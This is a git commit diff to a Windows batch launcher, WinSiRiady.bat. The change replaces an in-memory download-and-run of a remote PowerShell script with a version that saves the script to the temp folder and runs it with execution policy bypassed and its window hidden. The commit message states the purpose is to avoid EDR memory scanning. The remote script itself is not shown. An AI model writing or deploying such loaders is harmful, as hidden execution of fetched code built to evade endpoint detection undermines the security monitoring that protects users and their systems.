baa3dbd442c7e86dc2ce7923873c65874136772e
riadysandi <riadysandi@users.noreply.github.com>
2026-08-20 11:37:50 +0700

    Update batch file to download to disk before execution to avoid EDR memory scanning

--- WinSiRiady.bat
+++ WinSiRiady.bat
@@ -1,2 +1,3 @@
 @echo off
-powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/riadysandi/WinSiRiady/master/WinSiRiady.ps1') | iex"
+powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/riadysandi/WinSiRiady/master/WinSiRiady.ps1', '%TEMP%\WinSiRiady_temp.ps1')"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\WinSiRiady_temp.ps1"
